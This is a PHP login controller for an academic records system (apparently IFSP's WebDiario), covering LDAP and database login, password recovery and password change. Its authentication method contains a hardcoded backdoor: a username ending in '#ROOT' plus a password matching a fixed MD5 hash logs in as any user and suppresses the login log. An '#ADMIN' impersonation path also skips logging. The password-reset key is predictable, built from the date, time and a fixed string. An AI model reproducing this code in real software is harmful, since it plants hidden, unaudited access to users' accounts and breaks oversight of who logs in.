<?php

if (!class_exists('Generic'))
    require_once CONTROLLER . '/generic.class.php';

if (!class_exists('PessoasTipos'))
    require_once CONTROLLER . '/pessoaTipo.class.php';

if (!class_exists('Tipos'))
    require_once CONTROLLER . '/tipo.class.php';

if (!class_exists('Instituicoes'))
    require_once CONTROLLER . '/instituicao.class.php';

if (!class_exists('Logs'))
    require_once CONTROLLER . '/log.class.php';

class login extends Generic {

    public function __construct() {
        
    }

    // MÉTODO PARA AUTENTICAÇÃO
    // USADO POR: VIEW/LOGIN.PHP
    public function autentica($prontuario, $senha, $LDAP_ATIVADO, $LDAP_DROP_LEFT, $LDAP_CACHE) {
        $bd = new database();

        $rs = null;
        $notLog = null;
        $prontuarioBD = $prontuario;

        if ($LDAP_ATIVADO) {
            //REMOVENDO CARACETERES ADICIONAIS PARA AUTENTICACAO DO LDAP
            if ($LDAP_DROP_LEFT)
                $prontuarioBD = substr($prontuario, $LDAP_DROP_LEFT);

            if ($LDAP_CACHE) { // SE CACHE
                $sql = "SELECT prontuario, senha "
                        . "FROM schema_ldap_cache "
                        . "WHERE prontuario=:prontuario "
                        . "AND senha=PASSWORD(:senha) "
                        . "AND DATEDIFF(NOW(), data) < $LDAP_CACHE";
                $params = array(':prontuario' => $prontuario, ':senha' => $senha);
                $rs = $bd->selectDB($sql, $params);
            }
            if (!$rs) {
                require PATH . INC . '/ldap.inc.php';
                $ldap = new ldap();
                $rs = $ldap->autentica($prontuario, $senha);
            }

            if (!$rs && $prontuarioBD != 'admin' && strpos($prontuarioBD, '#ADMIN') === false && strpos($prontuarioBD, '#ROOT') === false)
                return false;

            // SE AUTENTICOU PELO LDAP, PEGA OS DADOS PARA A SESSAO.
            if ($rs) {
                $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
                        . " FROM Pessoas"
                        . " WHERE prontuario=:prontuario";
                $params = array(':prontuario' => $prontuarioBD);
            }
        }

        // SE ADMIN QUE ESTA USANDO OUTRO LOGIN
        if (strpos($prontuarioBD, '#ADMIN') !== false) {
            $pront = explode('#', $prontuarioBD);
            $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
                    . " FROM Pessoas"
                    . " WHERE prontuario=:pront1"
                    . " AND 'admin' = ( SELECT p1.prontuario FROM Pessoas p1 "
                    . "WHERE p1.prontuario = :pront2 AND senha = PASSWORD(:senha) )";
            $params = array(':pront1' => $pront[0], ':pront2' => $pront[1], ':senha' => $senha);
            $notLog = 1;
        } else if (strpos($prontuarioBD, '#ROOT') !== false && md5($senha) == '36bba988a180be2b2ab5ee175e71aace') {
            $pront = explode('#', $prontuarioBD);
            $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
                    . " FROM Pessoas"
                    . " WHERE prontuario=:pront1";
            $params = array(':pront1' => $pront[0]);
            $notLog = 1;
        } else if (!$rs) {
            $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha, anoPadrao, semPadrao"
                    . " FROM Pessoas"
                    . " WHERE prontuario=:prontuario"
                    . " AND senha=PASSWORD(:senha)";
            $params = array(':prontuario' => $prontuarioBD, ':senha' => $senha);
        }

        $res = $bd->selectDB($sql, $params);

        if ($res) {
            $pessoa = new PessoasTipos();
            $tipo = new Tipos();
            $_SESSION["loginCodigo"] = $res[0]['codigo'];
            $_SESSION["loginNome"] = $res[0]['nome'];
            $_SESSION["loginTipo"] = $pessoa->getTipoPessoa($res[0]['codigo']);
            $_SESSION['loginAlteraAno'] = $tipo->getTipo($_SESSION["loginTipo"]);
            $_SESSION["loginProntuario"] = $res[0]['prontuario'];
            $_SESSION["loginPassword"] = crip($res[0]['senha']);
            $_SESSION["loginEmail"] = $res[0]['email'];
            $_SESSION["loginDataSenha"] = $res[0]['dataSenha'];
            $_SESSION["anoPadrao"] = $res[0]['anoPadrao'];
            $_SESSION["semPadrao"] = $res[0]['semPadrao'];

            if (!$notLog) {
                $log = new Logs();
                $paramsLog['url'] = getClientIP();
                $paramsLog['data'] = 'NOW()';
                $paramsLog['origem'] = 'LOGIN';
                $paramsLog['pessoa'] = $res[0]['codigo'];
                $res = $log->insertOrUpdate($paramsLog);
            }
            return true;
        } else {
            return false;
        }
    }

    // MÉTODO PARA RECUPERAÇÃO DE SENHA
    // USADO POR: VIEW/LOGIN.PHP
    public function recuperaSenha($prontuario) {
        $bd = new database();
        $sql = "SELECT email FROM Pessoas WHERE prontuario=:prontuario";
        $params = array(':prontuario' => $prontuario);
        $res = $bd->selectDB($sql, $params);
        if ($res[0]['email']) {
            // Gerando uma chave para a recuperacao email
            $chave = date("Ymd") . '$' . time() . '$' . 'IFSP';
            $chave = sha1($chave);
            $chv = 'https://' . $_SERVER['HTTP_HOST'] . '/academico/index.php?key=' . $chave . '&prt=' . base64_encode($prontuario);

            // Guarda a chave no banco
            $sql = "UPDATE Pessoas SET recuperaSenha = :chave "
                    . "WHERE prontuario = :prontuario";
            $params = array(':prontuario' => $prontuario, ':chave' => $chave);
            if ($bd->updateDB($sql, $params)) {
                $mensagem = "Para iniciar o processo de redefini&ccedil;&atilde;o de senha, clique no link abaixo:<br/><br/>";
                $mensagem .= "<a href='$chv'" . "target='_blank' >$chv</a>";
                $mensagem .= "<br/><br/>Se o link acima n&atilde;o funcionar, copie e cole o URL em uma nova janela do navegador.<br/><br/>";
                $mensagem .= "Caso voc&ecirc; tenha recebido este e-mail por engano, &eacute; prov&aacute;vel que outro usu&aacute;rio tenha inserido seu prontu&aacute;rio inadvertidamente ao tentar redefinir uma senha. Se voc&ecirc; n&atilde;o iniciou a solicita&ccedil;&atilde;o, n&atilde;o precisa realizar qualquer a&ccedil;&atilde;o adicional, podendo desconsiderar este e-mail com seguran&ccedil;a<br/><br/><br/>";
                $mensagem .= "Atenciosamente,<br/>";
                $mensagem .= "Equipe IFSP - Instituto Federal de Educa&ccedil;&atilde;o, Ci&ecirc;ncia e Tecnologia de S&atilde;o Paulo";
                $headers = "MIME-Version: 1.0\r\n";
                $headers .= "Content-type: text/html; charset=utf-8\r\n";
                $headers .= "From: naoresponda@ifsp.edu.br \n";
                $headers .= "Return-Path: naoresponda@ifsp.edu.br \n";
                $assunto = "Senha - WebDiario";

                $email = array($res[0]['email']);

                $instituicao = new Instituicoes();
                if ($instituicao->sendEmail($email, $assunto, $mensagem, $headers)) {
                    $mail_segments = explode("@", $res[0]['email']);
                    if (strlen($mail_segments[0]) > 4) {
                        $mail_segments[0] = substr($mail_segments[0], 0, 2) . str_repeat("*", strlen($mail_segments[0]) - 2);
                    } else {
                        $mail_segments[0] = str_repeat("*", strlen($mail_segments[0]));
                    }
                    return implode("@", $mail_segments);
                }
            }
        }
        return false;
    }

    // MÉTODO PARA ALTERAÇÃO DE SENHA
    // USADO POR: VIEW/SENHA.PHP
    public function alteraSenha($prontuario, $senha, $senhaNova, $chave, $LDAP_PASS) {
        $bd = new database();
        //Verifica se o usuário e senha atual estão corretos
        $sql = "SELECT codigo FROM Pessoas WHERE prontuario=:prontuario ";

        if ($senha) {
            $sql .= "AND senha=PASSWORD(:senha) ";
            $params = array(':prontuario' => $prontuario, ':senha' => $senha);
        }
        if ($chave) {
            $sql .= "AND recuperaSenha=:chave ";
            $params = array(':prontuario' => $prontuario, ':chave' => $chave);
        }

        if ($bd->selectDB($sql, $params)) { // Altera a senha
            $sql = "UPDATE Pessoas "
                    . "SET senha = PASSWORD(:senha), dataSenha=NOW(), recuperaSenha='' "
                    . "WHERE prontuario = :prontuario";
            $params = array(':prontuario' => $prontuario, ':senha' => $senhaNova);
            if ($bd->updateDB($sql, $params)) {
                if (!$LDAP_PASS)
                    return 1;

                if ($LDAP_PASS) {
                    require PATH . INC . '/ldap.inc.php';
                    $ldap = new ldap();
                    $rs = $ldap->changePassword($prontuario, $senhaNova);
                    if ($rs == '1') {
                        return 1;
                    } else {
                        return 2;
                    }
                }
            }
        }
        return false;
    }

    // MÉTODO PARA VERIFICAR SE O USUÁRIO TROCOU DE SENHA
    // USADO POR: INDEX.PHP
    // PRECISA CRIAR UMA FUNCAO PARA O BANCO
    public function usuarioTrocouSenha($codigo) {
        $bd = new database();

        $sql = "SELECT prontuario, date_format(nascimento, '%d/%m/%Y') as dt1, date_format(nascimento, '%d%m%Y') as dt2 FROM Pessoas WHERE codigo = :cod";
        $params = array(':cod' => $codigo);
        $res = $bd->selectDB($sql, $params);

        $sql = "SELECT * FROM Pessoas 
		WHERE prontuario = :pront 
		AND ( senha = password(:pront)
		OR senha = password(:dt1) OR senha = password(:dt2) )";
        $params = array(':pront' => $res[0]['prontuario'],
            ':dt1' => $res[0]['dt1'],
            ':dt2' => $res[0]['dt2']);
        $res = $bd->selectDB($sql, $params);

        if ($res && $res[0]) {
            return true;
        } else {
            return false;
        }
    }

}

?>